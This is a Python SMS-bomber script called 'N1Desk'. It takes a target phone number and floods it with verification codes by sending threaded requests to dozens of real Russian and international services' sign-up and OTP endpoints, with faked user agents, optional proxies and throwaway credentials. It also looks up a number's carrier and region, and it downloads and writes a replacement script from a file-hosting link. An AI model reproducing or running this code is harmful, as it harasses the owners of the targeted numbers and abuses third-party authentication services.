import requests
import time
import os
from datetime import datetime
from pprint import pprint
import fake_useragent
import hashlib
from threading import Thread
import random
from bs4 import BeautifulSoup
from bs4.element import Tag
import re
import phonenumbers
from phonenumbers import timezone
from phonenumbers import geocoder, carrier
import zipfile
import pyzipper
import urllib.request
from urllib.parse import urlencode

B = '\u0040\u006C\u0061\u006D\u0065\u0072\u0031\u0031\u0032\u0033\u0031\u0031' 
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
P = '\033[35m'
Y = '\033[33m'
#=============ERRORS==============#
nameErrorCode = "False"
fileErrorCode = "False"
internetErrorCode = "False"
version = "1.5"
def download():
	print(G+"Download: "+C+version)
	thisPath = os.path.abspath(os.curdir)
	base_url = 'https://cloud-api.yandex.net/v1/disk/public/resources/download?'
	public_key = 'https://disk.yandex.ru/d/ofv8TxfFNYW4LA'
	try:
		final_url = base_url + urlencode(dict(public_key=public_key))
		response = requests.get(final_url)
		download_url = response.json()['href']
		download_response = requests.get(download_url)
		with open('N1Desk_v'+version+'.py', 'wb') as f:
			f.write(download_response.content)
		f.close()
	except:
		print("error")
		exit()
def allErrors():
	def nameError():
		pass
	def inputError():
		print(R+"[ERROR]"+Y+"InputError: Invalid Value Entered")
	def fileError():
		pass
	def internetError():
		pass
	if nameErrorCode == "True":
		return nameError()
	else:
		if inputErrorCode == "True":
			return inputError()
		else:
			if fileErrorCode == "True":
				return fileError()
			else:
				if internetErrorCode == "True":
					return internetError()
				else:
					print("wtfError")
#================================#
name = os.getlogin()
current_time = datetime.now().time()
current_time_str = str(current_time)
premFunc = "premium"
pc = "windows"
passwordPr = "Admin"
password1 = "lokpG"
salt = os.urandom(32)
premCode = hashlib.sha256(passwordPr.encode()).hexdigest()
premCode1 = hashlib.sha256(password1.encode()).hexdigest()
try:
	os.system("clear")
except:
	os.system("cls")
#=============BOMB===============#
def multiTB():
	global _name
	def bombTheard1():
		try:
			sent = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
								json={"reqId": "91101-1606335718",
									"params": {"phone": phone, "language": "ru-RU", "route": "sms",
										"devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"ICQ Sent")
			else:
				print(R+"[-]"+Y+"ICQ Not sent")
		except:
			print("error")
		try:
			sent = requests.post('https://findclone.ru/register', params={'phone': '+' + phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"OK Sent")
			else:
				print(R+"[-]"+Y+"OK Not sent")
		except:
			print("error")
		try:
			sent = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code", json={"phone_number": phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"YANDEX EDA Sent")
			else:
				print(R+"[-]"+Y+"YANDEX EDA Not sent")
		except:
			print(R+"[-]"+Y+"YANDEX EDA Not sent")
		try:
			sent = sent = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone},headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"Karusel Sent")
			else:
				print(R+"[-]"+Y+"Karusel Not sent")
		except:
			print("error")
		try:
			sent = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"TIK-TOK Sent")
			else:
				print(R+"[-]"+Y+"TIK-TOK Not sent")
		except:
			print("error")
		try:
			sent = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone},headers=headers1, timeout= 5.05)
			if sent.status_code == 200:
				print(G+"[+]"+C+"TIK-TOK Sent")
			else:
				print(R+"[-]"+Y+"TIK-TOK Not sent")
		except:
			print("error")
		try:
			sent = requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35", data={"phone": "+" + phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"TIK-TOK Sent")
			else:
				print(R+"[-]"+Y+"TIK-TOK Not sent")
		except:
			print("error")
		try:
			sent = requests.post("https://nn-card.ru/api/1.0/register", json={"phone": phone, "password": 'h19EIJ0u17uK3'}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"TIK-TOK Sent")
			else:
				print(R+"[-]"+Y+"TIK-TOK Not sent")
		except:
			print("error")
		try:
			sent = requests.post("https://youla.ru/web-api/auth/request_code", json={"phone": phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"TIK-TOK Sent")
			else:
				print(R+"[-]"+Y+"TIK-TOK Not sent")
		except:
			print("error")
		try:
			sent = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0", data={"l":regionCode}, headers=headers1)
			if sent.status_code == 200:
				print(G+"[+]"+C+"rutaxi Sent")
			else:
				print(R+"[-]"+Y+"rutaxi Not sent")
		except:
			print("error")
	def bombTheard2():
		try:
			sent = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]
			if sent.status_code == 200:
				print(G+"[+]"+C+"rutaxi Sent")
			else:
				print(R+"[-]"+Y+"rutaxi Not sent")
		except:
			print(R+'[-]'+Y+'RuTaxi Not sent')
	
		try:
			sent = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+'[+]'+C+' BelkaCar sent!')
		except:
			print(R+'[-]'+Y+'BelkaCar Not sent')
	
		try:
			sent = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+'[+]'+C+' Tinder sent!')
		except:
			print(R+'[-]'+Y+' gg Not sent')
	
		try:
			sent = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+'[+]'+C+' Karusel sent!')
		except:
			print(R+'[-]'+Y+' Karusel Not sent')
	
		try:
			sent = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+'[+]'+C+' Tinkoff sent!')
		except:
			print(R+'[-]'+Y+' Tinkoff Not sent')
	
		try:
			sent = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=headers1)
			if sent.status_code == 200:
				print(G+'[+]'+C+' MTS sent!')
		except:
			print(R+'[-]'+Y+' MTS Not sent')
	
		try:
			sent = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Youla sent!')
		except:
			print(R+'[-]'+Y+' Youla Not sent')
	
		try:
			sent = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' PizzaHut sent!')
		except:
			print(R+'[-]'+Y+' PizzaHut Not sent')
	
		try:
			sent = requests.post('https://www.rabota.ru/remind', data={'credential': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Rabota sent!')
		except:
			print(R+'[-]'+Y+' Rabota Not sent')
	
		try:
			sent = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Rutube sent!')
		except:
			print(R+'[-]'+Y+' Rutube Not sent')
	
		try:
			sent = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
			if sent.status_code == 200:
				print(G+'[+]'+C+' Citilink sent!')
		except:
			print(R+'[-]'+Y+' Citilink Not sent')
	
		try:
			sent = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': phone, 'promo': 'yellowforma'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Smsint sent!')
		except:
			print(R+'[-]'+Y+' Smsint Not sent')
	
		try:
			sent = requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
			if sent.status_code == 200:
				print(G+'[+]'+C+' oyorooms sent!')
		except:
			print(R+'[-]'+Y+' oyorooms Not sent')
	
		try:
			sent = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' MVideo sent!')
		except:
			print(R+'[-]'+Y+' MVideo Not sent')
	
		try:
			sent = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' newnext sent!')
		except:
			print(R+'[-]'+Y+' newnext Not sent')
	
		try:
			sent = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Sunlight sent!')
		except:
			print(R+'[-]'+Y+' Sunlight Not sent')
	
		try:
			sent = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' alpari sent!')
		except:
			print(R+'[-]'+Y+' alpari Not sent')
	
		try:
			sent = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Invitro sent!')
		except:
			print(R+'[-]'+Y+' Invitro Not sent')
	
		try:
			sent = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Sberbank sent!')
		except:
			print(R+'[-]'+Y+' Sberbank Not sent')
	
		try:
			sent = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Psbank sent!')
		except:
			print(R+'[-]'+Y+' Psbank Not sent')
	
		try:
			sent = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Beltelcom sent!')
		except:
			print(R+'[-]'+Y+' Beltelcom Not sent')
	
		try:
			sent = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Karusel sent!')
		except:
			print(R+'[-]'+Y+' Karusel Not sent')
	
		try:
			sent = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' KFC sent!')
		except:
			print(R+'[-]'+Y+' KFC Not sent')
	
		try:
			sent = requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			if sent.status_code == 200:
				print(G+'[+]'+C+' carsmile sent!')
		except:
			print(R+'[-]'+Y+' carsmile Not sent')
	
		try:
			sent = requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
			if sent.status_code == 200:
				print(G+'[+]'+C+' Citilink sent!')
		except:
			print(R+'[-]'+Y+' Citilink Not sent')
	
		try:
			sent = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Delitime sent!')
		except:
			print(R+'[-]'+Y+' Delitime Not sent')
	
		try:
			sent = requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' findclone call sent!')
		except:
			print(R+'[-]'+Y+' findclone Not sent')
	
		try:
			sent = requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Guru sent!')
		except:
			print(R+'[-]'+Y+' Guru Not sent')
	def bombTheard3():
		try:
			sent = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			if sent.status_code == 200:
				print(G+'[+]'+C+' ICQ sent!')
		except:
			print(R+'[-]'+Y+' ICQ Not sent')
	
		try:
			sent = requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			if sent.status_code == 200:
				print(G+'[+]'+C+' InDriver sent!')
		except:
			print(R+'[-]'+Y+' InDriver Not sent')
	
		try:
			sent = requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Invitro sent!')
		except:
			print(R+'[-]'+Y+' Invitro Not sent')
	
		try:
			sent = requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Pmsm sent!')
		except:
			print(R+'[-]'+Y+' Pmsm Not sent')
	
		try:
			sent = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' IVI sent!')
		except:
			print(R+'[-]'+Y+' IVI Not sent')
	
		try:
			sent = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Lenta sent!')
		except:
			print(R+'[-]'+Y+' Lenta Not sent')
	
		try:
			sent = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			if sent.status_code == 200:
				print(G+'[+]'+C+' MVideo sent!')
		except:
			print(R+'[-]'+Y+' MVideo Not sent')
	
		try:
			sent = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' OK sent!')
		except:
			print(R+'[-]'+Y+' OK Not sent')
	
		try:
			sent = requests.post('https://plink.tech/register/',json={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Plink sent!')
		except:
			print(R+'[-]'+Y+' Plink Not sent')
	
		try:
			sent = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' qlean sent!')
		except:
			print(R+'[-]'+Y+' qlean Not sent')
	
		try:
			sent = requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' SMSgorod sent!')
		except:
			print(R+'[-]'+Y+' SMSgorod Not sent')
	
		try:
			sent = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Tinder sent!')
		except:
			print(R+'[-]'+Y+' Tinder Not sent')
	
		try:
			sent = requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Twitch sent!')
		except:
			print(R+'[-]'+Y+' Twitch Not sent')
	
		try:
			sent = requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
			if sent.status_code == 200:
				print(G+'[+]'+C+' CabWiFi sent!')
		except:
			print(R+'[-]'+Y+' CabWiFi Not sent')
	
		try:
			sent = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2})
			if sent.status_code == 200:
				print(G+'[+]'+C+' WowWorks sent!')
		except:
			print(R+'[-]'+Y+' WowWorks Not sent')
	
		try:
			sent = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Eda.Yandex sent!')
		except:
			print(R+'[-]'+Y+' Eda.Yandex Not sent')
	
		try:
			sent = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Youla sent!')
		except:
			print(R+'[-]'+Y+' Youla Not sent')
	
		try:
			sent = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Alpari sent!')
		except:
			print(R+'[-]'+Y+' Alpari Not sent')
	
		try:
			sent = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' SMS sent!')
		except:
			print(R+'[-]'+Y+' SMS Not sent')
	
		try:
			sent = requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
			if sent.status_code == 200:
				print(G+'[+]'+C+' Delivery sent!')
		except:
			print(R+'[-]'+Y+' Delivery Not sent')
	def multiBombProxy():
		proxy = input(G+"Proxy: "+C)
		proxies = {
					'https': proxy,
		}
		pprint(proxies)
	def checkerMulti():
		try:
			if multiBombCall == "True":
				th1 = Thread(target=bombTheard1)
				th2 = Thread(target=bombTheard2)
				th3 = Thread(target=bombTheard3)
				th1.start()
				th2.start()
				th3.start()
				th1.join()
				th2.join()
				th3.join()
				return
		except:
			pass
		try:
			if multiBombProxyCall == "True":
				return multiBombProxy()
				return
		except:
			pass
		try:
			if multiBombCall1 == "True":
				th1 = Thread(target=bombTheard1)
				th2 = Thread(target=bombTheard2)
				th3 = Thread(target=bombTheard3)
				th1.start()
				th2.start()
				th3.start()
				th1.join()
				th2.join()
				th3.join()
				return
		except:
			pass
		try:
			if multiBombProxyCall1 == "True":
				return multiBombProxy()
				return
		except:
			global inputErrorCode
			inputErrorCode = "True"
			return allErrors()
	def checkPhone():
		_name_ = ""
		for x in range(12):
			_name = _name_ + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			global password
			global username
			password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		global headers1
		user = fake_useragent.UserAgent().random
		headers1 = {'user_agent': user}
		phonePlus = input(C+"       Enter phone:\n"+G+"N1Desk ==> ")
		global phone
		phone = phonePlus.replace("+","")
		global phoneOtherCountry
		phoneOtherCountry = phone[0]+phone[1]+phone[2]
		global regionCode
		phoneLen = len(phone)
		if phone[0] == "7" and phoneLen == 11:
			regionCode = phone[0]
			phoneCountry = "ru"
			print(G+"Region Code: "+C+regionCode)
			print(G+"Number Country: "+C+"RU")
			return checkerMulti()
		else:
			pass
		if phoneOtherCountry == "380" and phoneLen == 12:
			regionCode = phoneOtherCountry
			phoneCountry = "ua"
			print(G+"Region Code: "+C+regionCode)
			print(G+"Number Country: "+C+"UA")
			return checkerMulti()
		else:
			pass
		if phoneOtherCountry == "375" and phoneLen == 12:
			regionCode = phoneOtherCountry
			phoneCountry = "by"
			print(G+"Region Code: "+C+regionCode)
			print(G+"Number Country: "+C+"BY")
			return checkerMulti()
		else:
			print("Unknown number!")
			exit()
	checkPhone()
def normalB():
	def normalBomb():
		pass
	def normalBombProxy():
		proxy = input(G+"Proxy: "+C)
		proxies = {
					'https': proxy,
					'http': proxy,
		}
	def checkerNormal():
		if normalBombCall == "True":
			return normalBomb()
		if normalBombProxyCall == "True":
			return normalBombProxy == "True"
		if normalBombCall1 == "True":
			return normalBomb()
		if normalBombProxyCall1 == "True":
			return normalBombProxy == "True"
		else:
			global inputErrorCode
			inputErrorCode = "True"
			return allErrors()
	checkerNormal()
#================================#
banner = C+'''
     █──█──█─████──███─███─█──█           ⣿⡟⠙⢿⣿⣿⡿⠿⢿⣿
     ██─█─██─█──██─█───█───█─█─           ⣿⡇⠀⠀⠙⢿⡇⠀⢸⣿
     █─██──█─█──██─███─███─██──           ⣿⡇⠀⢠⡀⠀⠃⠀⢸⣿
     █──█──█─█──██─█─────█─█─█─           ⣿⡇⠀⢸⣿⣆⡀⠀⢸⣿
     █──█──█─████──███─███─█──█           ⣿⣷⣶⣾⣿⣿⣷⣤⣼⣿
     v 1.5
'''
def prem():
	try:
		ver_url2 = 'https://raw.githubusercontent.com/pashokkok/version/main/version.txt'
		ver_rqst2 = requests.get(ver_url2)
		ver_sc2 = ver_rqst2.status_code
		if ver_sc2 == 200:
			github_ver2 = ver_rqst2.text
			github_ver2 = github_ver2.strip()
			
			if version == github_ver2:
				pass
			else:
				print(C + '[!]' + G + ' Доступно : {} '.format(github_ver2) + C + '\n')
				print(R + '[-] Пожалуйста, обновите приложение до актуальной версии\n\n'+C+'[-] Лоудер закроется через 3 секунды')
				return download()
	except:
		print("error")
	print(banner)
	print(C+"       Session Information\n"+C+" • "+G+"Name: "+C+name+"\n"+C+" • "+G+"Trial: "+C+"Premium"+G+"\n"+C+" • "+G+"Start Time: "+C+current_time_str+"\n"+C+" • "+G+"Time left: "+C+"Infinity"+C)
	time.sleep(1)
	bombList = input(C+"       Choose type:\n"+C+" • "+G+"1.Multithreading"+G+"\n"+C+" • "+G+"2.Multithreading + proxy"+G+"\n"+C+" • "+G+"3.Normal"+G+"\n"+C+" • "+G+"4.Normal + proxy"+C+"\n    Or  Phone Info:\n"+C+" • "+G+"5.Phone Info"+C+"\nN1Desk ==> ")
	if bombList == "1":
		global multiBombCall
		multiBombCall = "True"
		return multiTB()
	if bombList == "2":
		global multiBombProxyCall
		multiBombProxyCall = "True"
		return multiTB()
	if bombList == "3":
		global normalBombCall
		normalBombCall = "True"
	if bombList == "4":
		global normalBombProxyCall
		normalBombProxyCall = "True"
		return normalB()
	if bombList == "5":
		def phoneInfo():
			phonePlus2 = input(C+"       Enter phone:\n"+G+"N1Desk ==> ")
			phoneDel = phonePlus2.replace("+","")
			phoneIsnNum = phoneDel.isnumeric()
			if True:
				phoneInf = "+"+phoneDel
			else:
				print("Вы ввели номер неверно")
			print(phoneInf)
			phoneNB = phonenumbers.parse(phoneInf)
			timeZoneNoText = timezone.time_zones_for_number(phoneNB)
			timeZone = str(timeZoneNoText)
			timeZone2 = timeZone.replace("(", "")
			timeZone3 = timeZone2.replace(")", "")
			timeZone4 = timeZone3.replace("'", "")
			timeZoneReplace = timeZone4.replace(",", "")
			Carrier = carrier.name_for_number(phoneNB, 'en')
			Region = geocoder.description_for_number(phoneNB, 'en')
			print(C+"       PhoneInfo:")
			print(G+"TimeZone: "+C+timeZoneReplace)
			print(G+"Carrier: "+C+Carrier)
			print(G+"Country: "+C+Region)
		phoneInfo()
	if bombList == "Multithreading":
		global multiBombCall1
		multiBombCall1 = "True"
		return multiTB()
	if bombList == "Multithreading + proxy":
		global multiBombProxyCall1
		multiBombProxyCall1 = "True"
		return multiTB()
	if bombList == "Normal":
		global normalBombCall1
		normalBombCall1 = "True"
		return normalB()
	if bombList == "Normal + proxy":
		global normalBombProxyCall1
		normalBombProxyCall1 = "True"
		return normalB()
def default():
	print("Nothing here")

def premium():
	premCode = "Admin"
	premCodeSHA = hashlib.sha256(premCode.encode()).hexdigest()
	premCode1 = "lokpG"
	premCode1SHA = hashlib.sha256(premCode1.encode()).hexdigest()
	PCheck = input("Введите код: ")
	if PCheck == premCode:
		with open("settings.txt", "w") as f:
			f.write("premium" + "\n")
			f.write(premCodeSHA)
			f.close()
		print("Success")
		return prem()
	if PCheck == premCode1:
		with open("settings.txt", "w") as f:
			f.write("premium" + "\n")
			f.write(premCode1SHA)
			f.close()
		print("Success")
		return prem()
	else:
		print("error")
		exit()
def windows():
	print("nothing here")

def syschoice():
	print(banner)
	try:
		os.remove("settings.txt")
	except FileNotFoundError:
		pass
	ver_url = 'https://raw.githubusercontent.com/pashokkok/version/main/version.txt'
	try:
	    print(C + '[#]' + G + ' Проверка обновлений ' + C + '\n')
	    time.sleep(1)
	    ver_rqst = requests.get(ver_url)
	    ver_sc = ver_rqst.status_code
	    if ver_sc == 200:
	        github_ver = ver_rqst.text
	        github_ver = github_ver.strip()
	
	        if version == github_ver:
	            print(G+'[+]' + G + ' Актуально ' + C + '\n')
	        else:
	            print(C + '[!]' + G + ' Доступно : {} '.format(github_ver) + C + '\n')
	            print(R + '[-] Пожалуйста, обновите приложение до актуальной версии.\n\n'+C+'[-] Лоудер закроется через 3 секунды')
	            return download()
	    else:
	        print(C + '[!]' + R + ' Статус : {} '.format(ver_sc) + C + '\n')
	except Exception as e:
	    print('\n' + R + '[-]' + C + ' Исключение : ' + W + str(e))
	choice= input(C+"       Trial:"+G+"\n1.Premium\n2.Free\nN1Desk ==> ")
	if choice == "1":
		return premium()
	if choice == "2":
		return default()
	if choice== "Premium":
		return premium()
	if choice == "Free":
		return default()
	if choice == "free":
		return default()
	if choice== "premium":
		return premium()
	if choice == "fre":
		return default()
	if choice == "Fre":
		return default()
	else:
		global inputErrorCode
		inputErrorCode = "True"
		allErrors()
def save():
	try:
		with open('settings.txt', 'r') as file:
			global osinf
			global codeKey
			osinf = str(file.readline().split())
			osinfnew = osinf.replace("[", "")
			osinfnew1 = osinfnew.replace("]", "")
			osinfCheck = osinfnew1.replace("'", "")
			codeKey = str(file.readline())
			if premFunc == osinfCheck:
				if premCode == codeKey:
					print(C+"AutoLog successfull")
					time.sleep(3)
					return prem()
				else:
					if premCode1 == codeKey:
						print(C+"AutoLog successfull")
						time.sleep(3)
						return prem()
					else:
						return syschoice() 
			else:
				if pc == osinf:
					if premCode == codeKey:
						print(C+"AutoLog successfull")
						time.sleep(3)
						return prem()
					else:
						if premCode1 == codeKey:
							print(C+"AutoLog successfull")
							time.sleep(3)
							return prem()
						else:
							return syschoice()
				else:
					return syschoice()
	except FileNotFoundError:
		return syschoice()
save()

